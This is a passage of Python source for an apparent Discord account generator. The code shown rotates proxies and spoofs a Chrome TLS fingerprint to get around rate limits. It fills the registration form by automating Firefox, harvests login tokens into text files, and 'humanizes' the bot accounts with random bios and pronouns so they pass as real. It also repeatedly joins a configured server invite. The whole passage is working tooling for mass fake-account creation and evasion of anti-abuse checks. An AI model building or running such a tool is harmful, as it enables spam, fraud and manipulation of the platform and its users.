right direction.', 'not possible is for the unwilling.', 'No pressure, no diamonds.', 'Perseverance can flip failure into success.', 'Love me or hate me, I’m still gonna shine.', 'I’ve got ninety nine problems, however our team isn’t one.', 'once life offers you lemons, throw them at someone!', 'i like my job only I’m on vacation.', 'i’m still sporting the smile you gave me.', 'Collect moments not things.', 'you are doing not notice the happy life. you create it.', 'Age isn’t any barrier. It’s a limitation you set on your mind.', 'solely nice minds will afford an easy style.', 'knowledge is that the fruit of sorrow and time.', 'Life could be a game and true love could be a trophy.', 'regardless of the night, the morning can forever come.', 'It’s dangerous to travel alone, take this!', 'keep for a while and listen!', 'I don’t want a gun. My friends are my strength!', 'Have a weekend ball with my best friend.', 'expensive quarterback. i favor it, however you shouldn’t.', 'That penalty was a tortilla chip problem.', 'I’m in an exceedingly serious relation-chip.', 'If you fail to prepare, you’re ready to fail.', 'I’m similar to a treat: half sweet and half nuts.', 'Then again, you have various fingers.', 'Time is valuable, squander it astutely.', 'Amazing has seven letters thus does meeeeee.', 'Whenever it downpours search for rainbows when it’s dim I search for stars.', 'Never be reluctant to sparkle.', 'simply 5 minutes more…', 'Steel wins battles, Gold wins wars', 'Be pleased with your work, notwithstanding it’s not the best.', 'I’m a giant person, therefore i favor my PlayStation triathlon.', 'The home is wherever you’re discording', 'Keep friends shut & notice enemies.', 'I create deliveries, That’s all.', 'Why do individuals use away messages? They’re so stupid!', 'm members don’t even grasp their athletic facility is closed', 'Today’s prediction: one hundred pc likelihood of winning.', 'i favor big punts, and that i cannot lie.', 'My team wants ketchup.', 'The road to protection passes through the gutter.', 'Gamers don’t die, they respawn.', 'Beauty fades. this is often why it’s stunning', 'It is higher to die than to face on your knees.', 'regardless of however small, all creatures have a right to exist during this world.', 'If I can’t notice them, I’ll fight them.', 'Yes! I’m a gamer, however i’ll not play till you begin playing.', 'Nothing is right, everything is allowed.', 'keep for a while and listen!', 'This may sound cheesy, but i believe my team is basically grate.', 'If you’re probing hell, keep going.', 'the incorrect individuals will forever teach you the proper lessons.', 'I would like it wasn’t easy, I wish you were higher.', 'try and be a rainbow in someone’s cloud.', 'Who runs the world? ME.', 'Transforming my fantasies into my vision and my vision into the real world.', 'I sparkle from inside so nobody can diminish my light.', 'Sprinkling generosity wherever I go.', 'This is my cup of care. Gracious see, it is vacant.', 'A young lady ought to be two things: Who and What she needs.', 'I’ve looked over great many miles with my thumbs.', 'Don’t be the same, be better.', 'browse books rather than reading my status.', 'Be robust I voiceless to my wireless fidelity signal.', 'Some individuals simply want a High-Five, on the face.', 'I’m not immature, I just shrewdness to possess fun.', 'Nothing is right, everything is allowed.', 'sensible isn’t good once better is expected.', 'keep hungry. keep foolish.', 'where you go, go along with all of your heart.', 'A positive angle changes everything.', 'i’m a person of fortune, and that i should look for my fortune.', 'If I cannot outsmart them, i’ll beat out them – Dota a pair of', 'i’m finished searching, i would like to be around and living.', 'Go far enough you meet yourself.', 'What’s on my list of must-dos? All over.', 'Once in a while all the spirit needs is a stroll in nature.', 'I would prefer to pass on from energy than of fatigue.', 'I’m a lord just for my sovereign.', 'In the event that I can’t do large stuff, I can do tiny things.', 'knowledge is that the fruit of sorrow and time.', 'Blessed, ne’er stressed, and football-obsessed.', 'try this game, one snack at a time.', 'This game is completely aiming to guac my world.', 'i’m a involved party with a thinker for contractions.', 'The home is wherever you’re discording', 'Keep calm and game on.', 'gambling isn’t a crime.', 'You have no plan how briskly my heart beats after I see you.', 'My Silence My perspective', 'once I’m sensible I’m Best… once I’m unhealthy I’m Worst', 'Born to specific to not Impress', 'Darling Chase Your Goal, Not American state.', 'Devil Admires My Work.', 'My vogue could be a Reflection Of My perspective And Personality.', 'Follow Me And I’ll Follow Back.', 'Kanye attitude with Drake feelings.', 'I’m a cake in look for her stud gem', 'to like oneself is that the starting of a life-long romance.', 'I’m out here hustlin’ to say what’s mine.', 'A goal is a dream with a deadline.', 'bear in mind it’s just a nasty day, not a bad life.', 'I’m a cake in look for her stud gem', 'presently expression affirmative to new adventures', 'I need to wherever i’m nowadays by being American state', 'I’m on my journey. be part of me by following along.', 'Pretty & Profitable', 'Life is gorgeous', 'Relationship status: Netflix and frozen dessert', 'i’m deserve the greatness I hold', 'in a very world of darkness research at the celebs', 'i’m The aristocrat Of my very own Fairy Tale.', 'Better days are coming. They are on Saturday and Sunday.', 'Try not to surrender. The start is the hardest all the time.', 'One great young lady merits 1,000 bitches.', 'I’m single not on the grounds that I don’t appeal to God for affection I’m single since I don’t play with LOVE.', 'sensible vibes. sensible friends. sensible times.', 'once life throws a rock at you, toss a brick.', 'I’m therefore deep even the ocean gets jealous', 'It’s not your job to love me, it’s mine.', 'the luggage underneath my eyes are Chanel', 'Glitter is that the solely possibility', 'you’re only down so as to create a foundation.', 'the person who has no imagination has no wings.', 'you create my heart smile.', 'It’s the limited things in life.', 'I don’t care who likes it and who doesn’t.', 'there’s nice Beauty In Simplicity.', 'something however inevitable', 'Follow me then follow the link below!', 'i used to be born to try and do precisely what I’m doing nowadays', 'I’m hurt however I still smile. That’s my life.', 'Being single is tied in with commending and it you’re in to see the value in your own space that.', 'They are destined to communicate, not to intrigue.', 'Since I can’t sing she doesn’t mean I will not sing.', 'Gradually one Walk Far!', 'Frequently delight slips through an entryway that you didn’t realize you left open.', 'in a very world wherever you’ll be anyone, be yourself', 'Life on earth is expensive, but it includes a free trip round the sun.', 'Not stopping till I reach my dreams.', 'I’d somewhat be detested for who i’m than favorite for who i’m not', 'generally I simply need to present it all up and become a handsome billionaire.', 'Welcome My Friends. Pls return Again.', 'Attitude and sophistication can continuously Be My initial Preference.', 'I’m not failed; my success is simply postponed.', 'i’m not afraid… i used to be born to try and do this.', 'i’d rather die of passion than of boredom.', 'i would like a six month holiday, double a year.', 'Work hard, travel harder.', 'i favor taking the scenic route.', 'Smile, it confuses people.', 'I create your heart laugh.', 'i’m walking on the endless path of success.', 'sudden friendships are the simplest ones.', 'does one grasp what i favor regarding people? Their dogs.', 'Haters Are the simplest Motivators.', 'King Is King With Or while not Queen, bear in mind That.', 'I Don’t Care regarding Popularity, I board Reality', 'Being Single Is My perspective', 'My Life, My Rules, therefore Keep Your scent out Of My Business', 'If I know what love is, it is because of you. Never leave me. Without you, I would be an empty flame, and my life would lose meaning.', 'Perfecting the love we can give is far more productive than finding the perfect person to love.', 'I became a good boxer when I stopped trying to remember them and tried to kill them.', 'One person can be an important part of a team, but one person cannot be a team.', 'I have always believed that my greatest asset is not my physical ability, it is my mental ability.', 'War is where children and fools are deceived with adults and bitter words are used to kill each other.', 'Hope you make a video game for me. Well, at least I didn’t go down without explaining myself first.', 'It’s time to kick ass and chew bubble gum…and I’m all outta gum.', 'Reliance upon others is a weakness for the strong but a strength for the weak. Wisdom and balance lie in knowing your nature over time.', 'Time passes, people move. Like a river’s flow, it never ends. A childish mind will turn to noble ambition.', 'A hero need not speak. When he is gone, the world will speak for him.', 'Why walk when you can ride?', 'When I Play A Fighting Game, I Press Random Buttons And Hope For The Best.', 'Play More Than One Game At A Time. This Is A Painless Way To Learn How To Do Any Things At Once.', 'In the point-blank game, I was taught how to work together, so that I became a strong team.', 'I have 3 games opened at the moment. Mario just threw a fireball towards hole 16 in the corner pocket, and you want me to chat with you?', 'The five S’s of sports training are: stamina, speed, strength, skill, and spirit; but the greatest of these is spirit.', 'The sole purpose of a child’s middle name, is so he can tell when he’s really in trouble.', 'When You Meet Your Enemies, It Means You’Re Heading In The Right Direction.', 'Hope is what makes us strong. It is why we are here. It is what we fight with when all else is lost.', 'I’ve struggled a long time with survivin’, but no matter what, you have to find something to fight for.', 'What is better – to be born good or to overcome your evil nature through great effort?', 'I’m Commander Shepard, and this is my favourite store on the Citadel!', 'An athlete cannot run with money in his pockets. He must run with hope in his heart and dreams in his head.', 'I tried a new game but my screen exploded. DND, I’m trying to put it back together with duck tape.', 'I learn to be stronger every day, to prove that I deserve to join the party – Said the gamers dragon nest', 'War Is Where The Young And Stupid Are Tricked By The Old & Bitter Into Killing Each Other.', 'Break a trillion dead lives and ask the past if honor is still important.', 'After all, by the time two people are left on the planet, someone wants to be dead.', 'Only one mind can understand the chaotic beauty of the world without obstacles.', 'The two are safely chasing the wide receiver with the ball on the football field.', 'The difference between the impossible and the possible depends on one’s determination.', 'Give me a kiss, and I’ll serenade you among the stars. Give me your love, and I will pluck each star to set at your feet.', 'I never could have accomplished what I have today without the love I feel from you!']
        bo = random.choice(biolist)
        payload = {
            "bio": bo
        }

        response = session.patch(f'https://discord.com/api/v9/users/%40me/profile', headers=headers, json=payload)
    
        match response.status_code:
            case 200:
                print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.GREEN}" + f" [+] Added bio {token[:25]}"+"***")
            case _:
                print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.RED} [-] Failed adding bio {token[:25]}"+"***",{response.json()})
    def Add_Pron(self, token):
        headers = self.Headers(token)

        payload = {
            "pronouns": random.choice(pronouns)
        }

        response = session.patch(f'https://discord.com/api/v9/users/%40me/profile', headers=headers, json=payload)
        
        match response.status_code:
            case 200:
                print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.GREEN}" + f" [+] Added pron {token[:25]}"+"***")
            case _:
                print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.RED} [-] Failed adding pron {token[:20]}"+"***",{response.json()})

def load_proxies() -> None:
    """Load proxies from proxiex.txt file and create infinite rotation"""
    global proxies, proxy_cycle
    try:
        with open(PROXY_FILE, 'r') as f:
            proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        if proxies:
            # Create an infinite cycle of proxies
            proxy_cycle = itertools.cycle(proxies)
            print(f"{timestamp()}{Fore.GREEN}[PROXY] Loaded {len(proxies)} proxies{Style.RESET_ALL}")
        else:
            print(f"{timestamp()}{Fore.RED}[PROXY] No valid proxies found in {PROXY_FILE}{Style.RESET_ALL}")
    except FileNotFoundError:
        print(f"{timestamp()}{Fore.RED}[PROXY] File {PROXY_FILE} not found{Style.RESET_ALL}")
        proxies = []

def get_next_proxy() -> Optional[Dict[str, str]]:
    """Get next proxy from the rotation"""
    global proxy_cycle
    
    if not proxy_cycle:
        return None
        
    try:
        proxy = next(proxy_cycle)
        username, password, host, port = proxy.split(':')
        formatted_proxy = f"http://{username}:{password}@{host}:{port}"
        print(f"{timestamp()}{Fore.BLUE}[PROXY]{Fore.GREEN} Switching to next proxy{Style.RESET_ALL}")
        return {
            "http": formatted_proxy,
            "https": formatted_proxy
        }
    except Exception as e:
        print(f"{timestamp()}{Fore.RED}[PROXY] Error getting next proxy: {str(e)}{Style.RESET_ALL}")
        return None

def account_ratelimit():
    try:
        proxy = get_next_proxy()
        if not proxy:
            print(f"{timestamp()}{Fore.RED}[ERROR] No valid proxy available{Style.RESET_ALL}")
            return 1

        # Initialize TLS client with better configuration
        client = tls_client.Session(
            client_identifier='chrome_110',
            random_tls_extension_order=True
        )
        
        client.proxies = proxy
        print(f"{timestamp()}{Fore.BLUE}[INFO]{Fore.GREEN} Using proxy: {proxy['http']}{Style.RESET_ALL}")

        # Test proxy before registration with requests instead of tls_client
        try:
            test = requests.get("https://discord.com/api/v9/experiments", 
                              proxies=proxy,
                              timeout=10)
            if test.status_code != 200:
                print(f"{timestamp()}{Fore.RED}[ERROR] Proxy connection failed{Style.RESET_ALL}")
                return 1
        except Exception as e:
            print(f"{timestamp()}{Fore.RED}[ERROR] Proxy test failed: {str(e)}{Style.RESET_ALL}")
            return 1

        # Rest of your existing code remains the same
        data = {
            'email': f"{''.join(random.choice(string.ascii_lowercase) for _ in range(9))}@gmail.com",
            'password': 'ultimate12$$',
            'date_of_birth': '2000-09-20',
            'username': f"ultimate{''.join(random.choice(string.digits) for _ in range(4))}",
            'consent': True,
            'captcha_key': None,
            'invite': None
        }

        # Make registration request
        req = client.post('https://discord.com/api/v9/auth/register', json=data)
        
        if 'captcha_key' in req.text:
            print(f"{timestamp()}{Fore.YELLOW}[CAPTCHA] Captcha required{Style.RESET_ALL}")
            return 1
            
        if 'The resource is being rate limited' in req.text:
            print(f"{timestamp()}{Fore.RED}[RATELIMIT] Switching to next proxy{Style.RESET_ALL}")
            return 1

        if req.status_code == 200:
            print(f"{timestamp()}{Fore.GREEN}[SUCCESS] Account created successfully{Style.RESET_ALL}")
            return 0

        print(f"{timestamp()}{Fore.RED}[ERROR] Registration failed: {req.text}{Style.RESET_ALL}")
        return 1

    except Exception as e:
        print(f"{timestamp()}{Fore.RED}[ERROR] {str(e)}{Style.RESET_ALL}")
        return 1

firefox_path = r"C:\Program Files\Mozilla Firefox\firefox.exe"
discord_register_url = "https://discord.com/register"

# Update the username generation part in the main loop
def generate_unique_username():
    """Generate a unique username with more randomization"""
    try:
        with open("usernames.txt", "r", encoding='cp1252') as f:
            usernames = f.readlines()
            usernames = [username.strip() for username in usernames]
            random_name = random.choice(usernames)
            
            # Add more randomization to make username unique
            random_suffix = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))
            random_numbers = ''.join(random.choice('0123456789') for _ in range(2))
            new_username = f"{random_name}{random_suffix}{random_numbers}"
            
            return new_username
    except Exception as e:
        print(f"{timestamp()}{Fore.RED}[ERROR] Failed to generate username: {str(e)}{Style.RESET_ALL}")
        return f"user{''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))}"

def test_proxy_connection(proxy):
    """Test proxy connection before using it"""
    try:
        # Use TLS client instead of requests for better reliability
        client = tls_client.Session(
            client_identifier='chrome_110',
            random_tls_extension_order=True
        )
        client.proxies = proxy
        
        response = client.get("https://discord.com/api/v9/experiments")
        return response.status_code == 200
                
    except Exception as e:
        print(f"{timestamp()}{Fore.RED}[ERROR] Proxy test failed: {str(e)}{Style.RESET_ALL}")
        return False

def configure_firefox_proxy(proxy_dict):
    """Configure Firefox to use the current proxy"""
    if not proxy_dict:
        return False
        
    try:
        # Kill any existing Firefox processes
        os.system('taskkill /F /IM firefox.exe /T')
        time.sleep(2)
        
        # Extract proxy details
        proxy_url = proxy_dict['http']
        auth_host = proxy_url.replace('http://', '')
        username_password, host_port = auth_host.split('@')
        username, password = username_password.split(':')
        host, port = host_port.split(':')
        
        # Create Firefox preferences
        prefs_js = f'''
user_pref("network.proxy.type", 1);
user_pref("network.proxy.http", "{host}");
user_pref("network.proxy.http_port", {port});
user_pref("network.proxy.ssl", "{host}"); 
user_pref("network.proxy.ssl_port", {port});
user_pref("network.proxy.socks", "{host}");
user_pref("network.proxy.socks_port", {port});
user_pref("network.proxy.socks_username", "{username}");
user_pref("network.proxy.socks_password", "{password}");
user_pref("network.proxy.share_proxy_settings", true);
user_pref("network.proxy.no_proxies_on", "");
'''
        # Write preferences to profile
        profile_path = os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles')
        profile_dir = next(os.walk(profile_path))[1][0]
        prefs_file = os.path.join(profile_path, profile_dir, 'prefs.js')
        
        with open(prefs_file, 'w') as f:
            f.write(prefs_js)
            
        # Launch Firefox with configured profile
        subprocess.Popen([
            firefox_path,
            "--private-window",
            "-P", "default",
            "--no-remote"
        ])
        
        time.sleep(5)  # Wait longer for Firefox to initialize
        return True
        
    except Exception as e:
        print(f"{timestamp()}{Fore.RED}[ERROR] Failed to configure Firefox proxy: {str(e)}{Style.RESET_ALL}")
        return False

def load_emails():
    if not os.path.exists("mails.txt"):
        print(f"{timestamp()}{Fore.RED}[ERROR] mails.txt not found!{Style.RESET_ALL}")
        sys.exit(1)
    with open("mails.txt", "r") as f:
        # Split each line into (email, password) tuple
        emails = [tuple(line.strip().split(':', 1)) for line in f if line.strip() and ':' in line]
    if not emails:
        print(f"{timestamp()}{Fore.RED}[ERROR] No valid emails found in mails.txt!{Style.RESET_ALL}")
        sys.exit(1)
    return emails

if __name__ == "__main__":
    try:
        print(f"{timestamp()}{Fore.YELLOW}[PROXY] Loading proxies...{Style.RESET_ALL}")
        load_proxies()
        
        # Get the Firefox path
        firefox_path = get_firefox_path()
        discord_register_url = "https://discord.com/register"

        emails = load_emails()
        email_index = 0

        while True:
            for attempt in range(5):  # Increased attempts
                proxy = get_next_proxy()
                if not proxy:
                    print(f"{timestamp()}{Fore.RED}[ERROR] No proxies available{Style.RESET_ALL}")
                    sys.exit(1)
            
                print(f"{timestamp()}{Fore.BLUE}[PROXY]{Fore.YELLOW} Testing proxy: {proxy['http']}{Style.RESET_ALL}")
            
                if test_proxy_connection(proxy):
                    print(f"{timestamp()}{Fore.BLUE}[PROXY]{Fore.GREEN} Found working proxy{Style.RESET_ALL}")
                
                    if configure_firefox_proxy(proxy):
                        print(f"{timestamp()}{Fore.BLUE}[PROXY]{Fore.GREEN} Firefox configured with proxy{Style.RESET_ALL}")
                        break
                    
                print(f"{timestamp()}{Fore.RED}[PROXY] Failed, trying next...{Style.RESET_ALL}")
                time.sleep(2)
            else:
                print(f"{timestamp()}{Fore.RED}[ERROR] Could not find working proxy after {attempt+1} attempts{Style.RESET_ALL}")
                sys.exit(1)
        
            # Wait for Firefox to fully initialize with proxy
            time.sleep(5)
        
            pyautogui.write(discord_register_url)
            pyautogui.press('enter')
            print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.GREEN}" + " [+] Opened the Discord registration page" + Style.RESET_ALL)
            print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.YELLOW}" + " [!] Press Enter to start registration" + Style.RESET_ALL)

            if email_index >= len(emails):
                print(f"{timestamp()}{Fore.RED}[ERROR] No more emails left in mails.txt!{Style.RESET_ALL}")
                sys.exit(1)
            email, email_pass = emails[email_index]
            email_index += 1
            mailbaba = email.split('@')[0]  # For mailbaba usage

            print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.GREEN}" + f" [+] Using mail from file: {email}" + Style.RESET_ALL)
                
            # Create usernames.txt if it doesn't exist
            if not os.path.exists("usernames.txt"):
                with open("usernames.txt", "w") as f:
                    f.write("user\ntest\ndemo\nexample\n")
                
            with open("usernames.txt", "r", encoding='cp1252') as f:
                usernames = f.readlines()
                usernames = [username.strip() for username in usernames]
                random_name = random.choice(usernames)
                random_numbers = ''.join(random.choice('0123456789') for _ in range(3))
                new_username = random_name+random_numbers
                new_username+=".fr"
            name = new_username
            import keyboard
            keyboard.wait('enter')
                
            print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.GREEN}" + " [+] Starting registration" + Style.RESET_ALL)
            time.sleep(3)

            # Fill email
            pyautogui.write(email)
            pyautogui.press('tab')
            time.sleep(0.5)

            # Fill username
            with open("names.txt", "r",encoding="utf-8") as f:
                names = f.readlines()
            names = [x.strip() for x in names]
            nam = random.choice(names)
            pyautogui.write(nam) 
            pyautogui.press('tab')
            time.sleep(0.5)

            # Fill display name
            pyautogui.write(name)
            pyautogui.press('tab')
            time.sleep(0.5)

            # Fill password
            pyautogui.write(email_pass)
            pyautogui.press('tab')
            time.sleep(0.5)

            # Fill DOB in correct order
            pyautogui.write("12") # Day
            pyautogui.press('tab')
            time.sleep(0.5)
            pyautogui.write("5") # Month  
            pyautogui.press('tab')
            time.sleep(0.5)
            pyautogui.write("1996") # Year
            time.sleep(0.5)

            # Accept terms
            pyautogui.moveTo(679, 805)
            time.sleep(0.5)
            pyautogui.click()
            time.sleep(0.5)

            # Submit form
            pyautogui.press('enter')

            # Handle rate limit
            limit = account_ratelimit()
            if limit > 1:
                print(f'{timestamp()}{Fore.BLUE}[INFO]{Fore.RED} [-] Ratelimited for {limit} seconds. Waiting...')
                time.sleep(limit + 1)
                pyautogui.press('enter')

            print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.GREEN}" + " [+] Registration submitted" + Style.RESET_ALL)
            time.sleep(2)
            pyautogui.hotkey('ctrl', 't')
            pyautogui.write("https://mailvenue.com/")
            pyautogui.press('enter')          
            keyboard.wait('enter')
            print(timestamp(),f"{Fore.BLUE}[INFO] {Fore.YELLOW} [!] ONCE MAIL PAGE IS LOADED PRESS ENTER"+Style.RESET_ALL )
            time.sleep(0.5)
            pyautogui.write(email)
            pyautogui.press('tab')
            pyautogui.write(email_pass) 
            pyautogui.press('enter') 
            print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.YELLOW}" + " [!] Once you solve captcha and account is created then verify email" + Style.RESET_ALL)
            print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.YELLOW}" + "[!] Press tab to get token and save it to tokens.txt" + Style.RESET_ALL)
            keyboard.wait('tab')
                
            # Save email and password
            try:
                with open("email_pass.txt","a") as f:
                    f.write(f"{email}:{email_pass} \n")
                    print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.GREEN}"+"[+] EMAIL AND PASSWORD SAVED TO email_pass.txt" + Style.RESET_ALL)
            except Exception as e:
                print(timestamp(),Fore.RED + f"Error saving email/password: {e}" + Style.RESET_ALL)
                
            # Get token
            try:
                session = requests.Session()
                with open('tokens.txt', 'a') as f:
                    mail = email
                    payload = {
                        'login': mail,
                        'password': email_pass,
                    }
                    headers = {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                        'Origin': 'https://discord.com',
                        'Referer': 'https://discord.com/login'
                    }
                    response = session.post('https://discord.com/api/v9/auth/login', json=payload, headers=headers)
                    try:
                        response_data = response.json()
                        if response.status_code == 200 and 'token' in response_data:
                            token = response_data['token']
                            f.write(f'{token}\n')
                            print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.GREEN}" + f" [+] Logged in to {email} with token {token[:25]}"+"***" + Style.RESET_ALL)
                            with open('evs.txt', 'a') as a:
                                a.write(f'{email}:{email_pass}:{token}\n')
                        else:
                            print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.RED} [-] Failed to login to {email}. Error: {response_data}" + Style.RESET_ALL)
                    except json.JSONDecodeError:
                        print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.RED} [-] Failed to parse response for {email}. Response: {response.text}" + Style.RESET_ALL)
            except Exception as e:
                print(timestamp(),Fore.RED + f"Error getting token: {e}" + Style.RESET_ALL)
                
            # Close browser windows
            print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.LIGHTMAGENTA_EX}" + f" [+] HUMANIZING TOKEN",token[:25]+"***")
            changer= Changer()
            ishumanizertrue = Config["humanizer"]
            if ishumanizertrue:
                try:
                
                    changer.Add_HypeSquad(token)
                    changer.Add_Pron(token)
                    changer.Add_Bio(token)
                    print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.LIGHTMAGENTA_EX}" + f"[+] HUMANIZED TOKEN",token[:25]+"***")
                except:
                    print(timestamp(),f"{Fore.BLUE}[INFO]{Fore.RED}" + f" [-] FAILED TO HUMANIZE TOKEN",token[:25]+"***")
            isnoncapmaker = Config["non_cap_maker"]
            if isnoncapmaker:
                b = Booster()
                invite = Config["server_invite_code"]
                c = b.join(token=token,invite=invite)
                g = 1
                while c!=2:
                    c = b.join(token=token,invite=invite)
                    g+=1
                print("MADE TOKEN",token[:25]+"***",f"NON CAP IN {g} TRIES")
            for i in range(3):
                pyautogui.hotkey('ctrl', 'w')
          
            time.sleep(1)
                
                
    except Exception as e:
        print(f"{timestamp()}{Fore.RED}Critical error: {str(e)}{Style.RESET_ALL}")
        input("Press Enter to exit...")
        sys.exit(1)
    